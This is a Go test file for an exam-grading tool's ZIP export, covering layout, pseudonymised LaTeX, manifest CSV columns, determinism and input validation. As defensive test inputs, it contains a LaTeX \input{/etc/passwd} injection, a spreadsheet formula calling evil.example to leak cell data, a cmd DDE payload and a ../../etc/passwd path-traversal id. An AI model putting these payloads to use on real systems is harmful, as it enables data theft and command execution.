package export

import (
	"archive/zip"
	"bytes"
	"encoding/csv"
	"image"
	"image/color"
	"image/draw"
	"image/jpeg"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/HaoWen46/adagrade/internal/imaging"
	"github.com/HaoWen46/adagrade/internal/regrade"
	"github.com/HaoWen46/adagrade/internal/transcribe"
)

// ---- fixtures ------------------------------------------------------------
//
// Every identity below is synthetic (historical figures + obviously fake ids).
// CLAUDE.md forbids committing real student PII, and a privacy fixture is the
// last place that rule may be bent.

func maskedPage(t *testing.T, c color.RGBA) imaging.MaskedImage {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, 16, 16))
	draw.Draw(img, img.Bounds(), image.NewUniform(c), image.Point{}, draw.Src)
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80}); err != nil {
		t.Fatalf("encode fixture JPEG: %v", err)
	}
	// LoadMasked is the audited gate: only a "/masked/" storage key may be
	// wrapped, which is exactly how the real caller reads the stored artifact.
	m, err := imaging.LoadMasked("assessments/7/pages/masked/p.jpg", buf.Bytes())
	if err != nil {
		t.Fatalf("imaging.LoadMasked: %v", err)
	}
	return m
}

func answerDoc() transcribe.Doc {
	return transcribe.Doc{
		Title: "ignored — export sets its own title",
		Blocks: []transcribe.Block{
			{Kind: transcribe.BlockProse, Text: `Greedy by end time; runs in $O(n \log n)$.`},
			{Kind: transcribe.BlockMath, Text: `T(n) = 2T(n/2) + O(n)`},
		},
	}
}

// sampleInput is deliberately NOT in sorted-id order, so every ordering
// assertion below is testing the sort rather than the fixture.
func sampleInput(t *testing.T) Input {
	t.Helper()
	return Input{
		AssessmentName: "Algorithms Midterm 2",
		ProblemNumber:  3,
		Answers: []Answer{
			{
				Identity:   regrade.Identity{Name: "Grace Hopper", StudentID: "b09901007", Email: "hopper@example.edu"},
				Doc:        answerDoc(),
				Pages:      []imaging.MaskedImage{maskedPage(t, color.RGBA{R: 200, A: 255})},
				Status:     StatusOK,
				Source:     SourceDedicated,
				Confidence: "0.91",
			},
			{
				Identity:   regrade.Identity{Name: "Ada Lovelace", StudentID: "b09901002", Email: "lovelace@example.edu"},
				Doc:        answerDoc(),
				Pages:      []imaging.MaskedImage{maskedPage(t, color.RGBA{G: 200, A: 255}), maskedPage(t, color.RGBA{B: 200, A: 255})},
				Status:     StatusOK,
				Source:     SourceGradingCache,
				Confidence: "0.88",
			},
			{
				Identity: regrade.Identity{Name: "Edsger Dijkstra", StudentID: "b09901005", Email: "dijkstra@example.edu"},
				Pages:    []imaging.MaskedImage{maskedPage(t, color.RGBA{R: 90, G: 90, B: 90, A: 255})},
				Status:   StatusIllegible,
				Source:   SourceDedicated,
			},
			{
				Identity: regrade.Identity{Name: "Barbara Liskov", StudentID: "b09901009", Email: "liskov@example.edu"},
				Status:   StatusAbsent,
			},
		},
	}
}

// ---- layout --------------------------------------------------------------

// TestBuildZIP_ProducesTheDocumentedFileLayout pins the spec §3 output
// contract exactly: one root dir, _all.tex, MANIFEST.csv, tex/, images/.
func TestBuildZIP_ProducesTheDocumentedFileLayout(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	got := zipEntryNames(t, out)
	want := []string{
		"algorithms-midterm-2-p3/_all.tex",
		"algorithms-midterm-2-p3/MANIFEST.csv",
		"algorithms-midterm-2-p3/tex/b09901002.tex",
		"algorithms-midterm-2-p3/tex/b09901005.tex",
		"algorithms-midterm-2-p3/tex/b09901007.tex",
		"algorithms-midterm-2-p3/tex/b09901009.tex",
		"algorithms-midterm-2-p3/images/b09901002-p1.jpg",
		"algorithms-midterm-2-p3/images/b09901002-p2.jpg",
		"algorithms-midterm-2-p3/images/b09901005.jpg",
		"algorithms-midterm-2-p3/images/b09901007.jpg",
	}
	if len(got) != len(want) {
		t.Fatalf("zip entries =\n%v\nwant\n%v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("zip entry %d = %q, want %q (full: %v)", i, got[i], want[i], got)
		}
	}
}

// TestBuildZIP_MultiPageAnswerGetsPageSuffixes and its single-page sibling pin
// the naming rule that "-p1" appears ONLY when it disambiguates.
func TestBuildZIP_MultiPageAnswerGetsPageSuffixes(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	names := strings.Join(zipEntryNames(t, out), "\n")
	for _, want := range []string{"images/b09901002-p1.jpg", "images/b09901002-p2.jpg"} {
		if !strings.Contains(names, want) {
			t.Errorf("multi-page answer missing %q; entries:\n%s", want, names)
		}
	}
	if strings.Contains(names, "images/b09901002.jpg") {
		t.Error("a multi-page answer must not also emit an unsuffixed image")
	}
}

func TestBuildZIP_SinglePageAnswerHasNoPageSuffix(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	names := strings.Join(zipEntryNames(t, out), "\n")
	if !strings.Contains(names, "images/b09901007.jpg") {
		t.Errorf("single-page answer must be unsuffixed; entries:\n%s", names)
	}
	if strings.Contains(names, "images/b09901007-p1.jpg") {
		t.Error("single-page answer must not carry a -p1 suffix")
	}
}

func TestBuildZIP_ImageBytesAreTheSuppliedMaskedBytesVerbatim(t *testing.T) {
	in := sampleInput(t)
	out, err := BuildZIP(in)
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	// b09901007 is Answers[0] in the fixture, single page.
	want := in.Answers[0].Pages[0].JPEG()
	got := zipEntryBytes(t, out, "algorithms-midterm-2-p3/images/b09901007.jpg")
	if !bytes.Equal(got, want) {
		t.Error("exported image bytes must be the masked bytes verbatim (no re-encode)")
	}
}

// ---- _all.tex ------------------------------------------------------------

// TestBuildZIP_AllTexIsOneStandaloneDocument is the requirement that _all.tex
// is a single compilable document, not N concatenated standalone files.
func TestBuildZIP_AllTexIsOneStandaloneDocument(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	all := zipEntryContent(t, out, "algorithms-midterm-2-p3/_all.tex")

	for _, one := range []string{`\documentclass`, `\begin{document}`, `\end{document}`} {
		if n := strings.Count(all, one); n != 1 {
			t.Errorf("_all.tex has %d occurrences of %q, want exactly 1", n, one)
		}
	}
	if n := strings.Count(all, `\usepackage{xeCJK}`); n != 1 {
		t.Errorf("_all.tex has %d preambles (counted by xeCJK), want 1", n)
	}
	if got, want := strings.Count(all, `\section*{Student `), 4; got != want {
		t.Errorf("_all.tex has %d student sections, want %d", got, want)
	}
	if i, j := strings.Index(all, `\begin{document}`), strings.Index(all, `\section*{Student 001}`); i > j {
		t.Error("student sections must fall inside the document body")
	}
}

// TestBuildZIP_AllTexIsPseudonymousInSortedIDOrder pins both halves of the
// pseudonym rule: the labels are Student NNN, and NNN is assigned by sorted
// student id so the mapping is reproducible across runs.
func TestBuildZIP_AllTexIsPseudonymousInSortedIDOrder(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	all := zipEntryContent(t, out, "algorithms-midterm-2-p3/_all.tex")

	var order []int
	for _, label := range []string{"Student 001", "Student 002", "Student 003", "Student 004"} {
		i := strings.Index(all, `\section*{`+label+`}`)
		if i < 0 {
			t.Fatalf("_all.tex missing section %q", label)
		}
		order = append(order, i)
	}
	for i := 1; i < len(order); i++ {
		if order[i] <= order[i-1] {
			t.Fatalf("student sections are out of order: offsets %v", order)
		}
	}

	// The decoder ring must agree: sorted ids map to 001..004 in order.
	rows := manifestRows(t, out)
	wantIDs := []string{"b09901002", "b09901005", "b09901007", "b09901009"}
	for i, id := range wantIDs {
		if rows[i][0] != id || rows[i][1] != []string{"Student 001", "Student 002", "Student 003", "Student 004"}[i] {
			t.Errorf("manifest row %d = %v, want student_id %q with the matching pseudonym", i, rows[i], id)
		}
	}
}

func TestBuildZIP_PerStudentTexIsStandaloneAndTitledByProblem(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	tex := zipEntryContent(t, out, "algorithms-midterm-2-p3/tex/b09901007.tex")
	for _, want := range []string{`\documentclass`, `\usepackage{xeCJK}`, `\begin{document}`, `\end{document}`, `\section*{Problem 3}`} {
		if !strings.Contains(tex, want) {
			t.Errorf("per-student .tex missing %q", want)
		}
	}
	// The caller's Doc.Title is app-controlled in theory and student-derived in
	// the worst case, so export must overwrite it rather than trust it.
	if strings.Contains(tex, "ignored") {
		t.Error("export must set the section title itself, not echo Doc.Title")
	}
	if !strings.Contains(tex, `$O(n \log n)$`) {
		t.Error("safe inline math must survive into the per-student .tex")
	}
}

func TestBuildZIP_AbsentAnswerStillGetsACompilableTexAndAManifestRow(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	tex := zipEntryContent(t, out, "algorithms-midterm-2-p3/tex/b09901009.tex")
	for _, want := range []string{`\documentclass`, `\begin{document}`, `\end{document}`} {
		if !strings.Contains(tex, want) {
			t.Errorf("absent student's .tex must still be compilable; missing %q", want)
		}
	}
	if !strings.Contains(tex, "% status: absent") {
		t.Error("a non-ok status must be legible in the .tex source itself, not only in the manifest")
	}
	row := manifestRow(t, out, "b09901009")
	if row[3] != "absent" {
		t.Errorf("manifest status = %q, want %q", row[3], "absent")
	}
	if row[2] != "0" {
		t.Errorf("manifest pages = %q, want %q", row[2], "0")
	}
}

// ---- manifest ------------------------------------------------------------

func TestBuildZIP_ManifestHasTheDocumentedColumns(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	recs := manifestRecords(t, out)
	want := []string{"student_id", "pseudonym", "pages", "status", "source", "confidence", "flags"}
	if len(recs[0]) != len(want) {
		t.Fatalf("manifest header = %v, want %v", recs[0], want)
	}
	for i := range want {
		if recs[0][i] != want[i] {
			t.Fatalf("manifest header = %v, want %v", recs[0], want)
		}
	}
}

// TestBuildZIP_ManifestDistinguishesAllFourStatuses is the "empty .tex is
// ambiguous" requirement: wrote-nothing, unreadable, transcription-failed and
// never-scanned must be four distinguishable facts.
func TestBuildZIP_ManifestDistinguishesAllFourStatuses(t *testing.T) {
	in := sampleInput(t)
	in.Answers = append(in.Answers, Answer{
		Identity: regrade.Identity{Name: "Alan Turing", StudentID: "b09901011", Email: "turing@example.edu"},
		Pages:    []imaging.MaskedImage{maskedPage(t, color.RGBA{A: 255})},
		Status:   StatusFailed,
		Source:   SourceDedicated,
	})
	out, err := BuildZIP(in)
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	for id, want := range map[string][2]string{
		"b09901007": {"ok", "dedicated"},
		"b09901002": {"ok", "grading-cache"},
		"b09901005": {"illegible", "dedicated"},
		"b09901011": {"failed", "dedicated"},
		"b09901009": {"absent", ""},
	} {
		row := manifestRow(t, out, id)
		if row[3] != want[0] || row[4] != want[1] {
			t.Errorf("manifest row for a student = status %q source %q, want %q / %q", row[3], row[4], want[0], want[1])
		}
	}
}

func TestBuildZIP_ManifestCarriesPageCountConfidenceAndFlags(t *testing.T) {
	in := sampleInput(t)
	in.Answers[0].Flags = []string{"low-contrast scan"}
	in.Answers[0].Doc.Blocks = append(in.Answers[0].Doc.Blocks,
		transcribe.Block{Kind: transcribe.BlockMath, Text: `\input{/etc/passwd}`})

	out, err := BuildZIP(in)
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	row := manifestRow(t, out, "b09901007")
	if row[2] != "1" {
		t.Errorf("pages = %q, want %q", row[2], "1")
	}
	if row[5] != "0.91" {
		t.Errorf("confidence = %q, want %q", row[5], "0.91")
	}
	if !strings.Contains(row[6], "low-contrast scan") {
		t.Errorf("caller flags must survive into the manifest; got %q", row[6])
	}
	if !strings.Contains(row[6], "demoted display math") {
		t.Errorf("emitter demotions must be reported, not hidden; got %q", row[6])
	}
	// A demoted fragment must never reach the compiler.
	if strings.Contains(zipEntryContent(t, out, "algorithms-midterm-2-p3/tex/b09901007.tex"), `\input`) {
		t.Error("a rejected command leaked into the exported .tex")
	}
}

// TestBuildZIP_ManifestNeutralisesSpreadsheetFormulas — the manifest is opened
// in Excel or Numbers by a human, and the flags column can carry text derived
// from model output, which this feature's threat model treats as hostile.
func TestBuildZIP_ManifestNeutralisesSpreadsheetFormulas(t *testing.T) {
	in := sampleInput(t)
	in.Answers[0].Flags = []string{`=HYPERLINK("http://evil.example/"&A1,"click")`}
	in.Answers[1].Confidence = "-1+cmd|' /c calc'!A0"

	out, err := BuildZIP(in)
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	if got := manifestRow(t, out, "b09901007")[6]; !strings.HasPrefix(got, "'=") {
		t.Errorf("a formula-leading flag must be neutralised; got %q", got)
	}
	if got := manifestRow(t, out, "b09901002")[5]; !strings.HasPrefix(got, "'-") {
		t.Errorf("a formula-leading confidence must be neutralised; got %q", got)
	}
	// Ordinary values must be left exactly as they are.
	if got := manifestRow(t, out, "b09901005")[3]; got != "illegible" {
		t.Errorf("a benign field was rewritten: %q", got)
	}
}

func TestBuildZIP_ManifestRowOrderIsSortedByStudentID(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	rows := manifestRows(t, out)
	for i := 1; i < len(rows); i++ {
		if rows[i-1][0] >= rows[i][0] {
			t.Fatalf("manifest rows are not sorted by student_id at row %d", i)
		}
	}
}

// ---- determinism ---------------------------------------------------------

// TestBuildZIP_IsByteIdenticalForIdenticalInput is the re-export-is-free
// contract from spec §2: two builds of identical input must not differ, which
// rules out map-iteration order, caller slice order, and clock stamps.
//
// The un-slept comparison alone would NOT catch an unpinned modification time:
// ZIP timestamps have 1-second (extended field) and 2-second (MS-DOS field)
// granularity, so two builds microseconds apart agree by luck. Hence the
// deliberate cross-second-boundary rebuild — skipped under -short, where
// TestBuildZIP_PinsEntryModificationTimes still guards the same property
// structurally.
func TestBuildZIP_IsByteIdenticalForIdenticalInput(t *testing.T) {
	a, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	b, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	if !bytes.Equal(a, b) {
		t.Fatalf("two builds of identical input differ (%d vs %d bytes)", len(a), len(b))
	}

	if testing.Short() {
		t.Skip("skipping the cross-second-boundary rebuild under -short")
	}
	time.Sleep(1100 * time.Millisecond)
	c, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	if !bytes.Equal(a, c) {
		t.Fatal("a build one second later differs — a wall-clock stamp is leaking into the archive")
	}
}

func TestBuildZIP_PinsEntryModificationTimes(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	zr, err := zip.NewReader(bytes.NewReader(out), int64(len(out)))
	if err != nil {
		t.Fatalf("open zip: %v", err)
	}
	for _, f := range zr.File {
		if !f.Modified.Equal(zipEpoch) {
			t.Errorf("entry %q modified = %s, want the pinned epoch %s", f.Name, f.Modified, zipEpoch)
		}
	}
}

// TestBuildZIP_AnswerOrderDoesNotChangeOutput guards the sort: the caller's
// slice order must not leak into the archive.
func TestBuildZIP_AnswerOrderDoesNotChangeOutput(t *testing.T) {
	a, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	shuffled := sampleInput(t)
	shuffled.Answers[0], shuffled.Answers[3] = shuffled.Answers[3], shuffled.Answers[0]
	b, err := BuildZIP(shuffled)
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	if !bytes.Equal(a, b) {
		t.Error("archive must not depend on the caller's answer ordering")
	}
}

// ---- validation ----------------------------------------------------------

func TestBuildZIP_RejectsNoAnswers(t *testing.T) {
	in := sampleInput(t)
	in.Answers = nil
	if _, err := BuildZIP(in); err == nil {
		t.Fatal("BuildZIP must reject an export with no answers")
	}
}

func TestBuildZIP_RejectsNonPositiveProblemNumber(t *testing.T) {
	for _, n := range []int{0, -1} {
		in := sampleInput(t)
		in.ProblemNumber = n
		if _, err := BuildZIP(in); err == nil {
			t.Errorf("BuildZIP must reject problem number %d", n)
		}
	}
}

func TestBuildZIP_RejectsDuplicateStudentIDs(t *testing.T) {
	in := sampleInput(t)
	in.Answers[1].Identity.StudentID = in.Answers[0].Identity.StudentID
	if _, err := BuildZIP(in); err == nil {
		t.Fatal("duplicate ids would silently overwrite one student's files")
	}
	// macOS and Windows filesystems are case-insensitive, so a case-only
	// difference collides just the same.
	in = sampleInput(t)
	in.Answers[1].Identity.StudentID = "B09901007"
	if _, err := BuildZIP(in); err == nil {
		t.Fatal("case-only-different ids collide on case-insensitive filesystems")
	}
}

func TestBuildZIP_RejectsStudentIDsThatAreUnsafeAsFilenames(t *testing.T) {
	for _, bad := range []string{"", "../../etc/passwd", "a/b", ".", "..", "b099 01007", "b09901007\n"} {
		in := sampleInput(t)
		in.Answers[0].Identity.StudentID = bad
		if _, err := BuildZIP(in); err == nil {
			t.Errorf("BuildZIP accepted a student id unsafe as a filename (%d bytes)", len(bad))
		}
	}
}

func TestBuildZIP_RejectsUnknownStatusAndSource(t *testing.T) {
	in := sampleInput(t)
	in.Answers[0].Status = "maybe"
	if _, err := BuildZIP(in); err == nil {
		t.Error("BuildZIP must reject a status outside the closed set")
	}

	in = sampleInput(t)
	in.Answers[0].Source = "vibes"
	if _, err := BuildZIP(in); err == nil {
		t.Error("BuildZIP must reject a source outside the closed set")
	}

	in = sampleInput(t)
	in.Answers[0].Source = ""
	if _, err := BuildZIP(in); err == nil {
		t.Error("a transcribed answer must record where the transcription came from")
	}
}

// TestBuildZIP_RejectsAbsentAnswersThatHavePages keeps "absent" meaning
// "never scanned" rather than becoming a free-form label.
func TestBuildZIP_RejectsAbsentAnswersThatHavePages(t *testing.T) {
	in := sampleInput(t)
	in.Answers[3].Pages = []imaging.MaskedImage{maskedPage(t, color.RGBA{A: 255})}
	if _, err := BuildZIP(in); err == nil {
		t.Error("an answer with scanned pages is not absent")
	}

	in = sampleInput(t)
	in.Answers[3].Source = SourceDedicated
	if _, err := BuildZIP(in); err == nil {
		t.Error("an absent answer has no transcription source")
	}
}

func TestBuildZIP_RejectsArchivesOverTheSizeCap(t *testing.T) {
	orig := MaxZipBytes
	MaxZipBytes = 32
	defer func() { MaxZipBytes = orig }()

	if _, err := BuildZIP(sampleInput(t)); err == nil {
		t.Fatal("BuildZIP must refuse to build past MaxZipBytes")
	}
}

// TestBuildZIP_SurvivesAnAnswerWithNoBlocks covers the illegible case: pages
// exist, the transcription is empty, and the export must still be valid.
func TestBuildZIP_SurvivesAnAnswerWithNoBlocks(t *testing.T) {
	out, err := BuildZIP(sampleInput(t))
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	tex := zipEntryContent(t, out, "algorithms-midterm-2-p3/tex/b09901005.tex")
	if !strings.Contains(tex, `\end{document}`) {
		t.Error("an illegible answer must still produce a compilable document")
	}
	if !strings.Contains(tex, "% status: illegible") {
		t.Error("illegible status must be legible in the source")
	}
}

// TestBuildZIP_EveryEntryNameIsPureASCII is the whole-path guard behind
// Slug's ASCII rule: macOS's bundled Info-ZIP rejects an entire archive that
// carries a non-ASCII entry name (see TestLive_ArchiveExtractsWithSystemUnzip),
// and student ids reach entry names too, so checking Slug alone is not enough.
func TestBuildZIP_EveryEntryNameIsPureASCII(t *testing.T) {
	in := sampleInput(t)
	in.AssessmentName = "微積分 期中考（2026）"
	out, err := BuildZIP(in)
	if err != nil {
		t.Fatalf("BuildZIP: %v", err)
	}
	for _, name := range zipEntryNames(t, out) {
		for i := 0; i < len(name); i++ {
			if name[i] > 0x7f {
				t.Errorf("entry name %q has a non-ASCII byte at %d", name, i)
				break
			}
		}
	}
}

func TestRootDir_NamesTheArchiveRoot(t *testing.T) {
	in := sampleInput(t)
	if got, want := in.RootDir(), "algorithms-midterm-2-p3"; got != want {
		t.Errorf("RootDir() = %q, want %q", got, want)
	}
}

// ---- zip helpers ---------------------------------------------------------

func zipEntryNames(t *testing.T, zipBytes []byte) []string {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(zipBytes), int64(len(zipBytes)))
	if err != nil {
		t.Fatalf("open zip: %v", err)
	}
	names := make([]string, 0, len(zr.File))
	for _, f := range zr.File {
		names = append(names, f.Name)
	}
	return names
}

func zipEntryBytes(t *testing.T, zipBytes []byte, name string) []byte {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(zipBytes), int64(len(zipBytes)))
	if err != nil {
		t.Fatalf("open zip: %v", err)
	}
	for _, f := range zr.File {
		if f.Name != name {
			continue
		}
		rc, err := f.Open()
		if err != nil {
			t.Fatalf("open zip entry %q: %v", name, err)
		}
		defer rc.Close()
		b, err := io.ReadAll(rc)
		if err != nil {
			t.Fatalf("read zip entry %q: %v", name, err)
		}
		return b
	}
	t.Fatalf("zip entry %q not found (have %v)", name, zipEntryNames(t, zipBytes))
	return nil
}

func zipEntryContent(t *testing.T, zipBytes []byte, name string) string {
	t.Helper()
	return string(zipEntryBytes(t, zipBytes, name))
}

func manifestRecords(t *testing.T, zipBytes []byte) [][]string {
	t.Helper()
	var root string
	for _, n := range zipEntryNames(t, zipBytes) {
		if i := strings.Index(n, "/"); i > 0 {
			root = n[:i]
			break
		}
	}
	raw := zipEntryBytes(t, zipBytes, root+"/MANIFEST.csv")
	r := csv.NewReader(bytes.NewReader(raw))
	r.Comment = '#' // the manifest's not-for-upload notice rides as a comment line
	recs, err := r.ReadAll()
	if err != nil {
		t.Fatalf("parse MANIFEST.csv: %v", err)
	}
	if len(recs) == 0 {
		t.Fatal("MANIFEST.csv is empty")
	}
	return recs
}

func manifestRows(t *testing.T, zipBytes []byte) [][]string {
	t.Helper()
	return manifestRecords(t, zipBytes)[1:]
}

func manifestRow(t *testing.T, zipBytes []byte, studentID string) []string {
	t.Helper()
	for _, r := range manifestRows(t, zipBytes) {
		if r[0] == studentID {
			return r
		}
	}
	t.Fatalf("no manifest row for the requested student")
	return nil
}
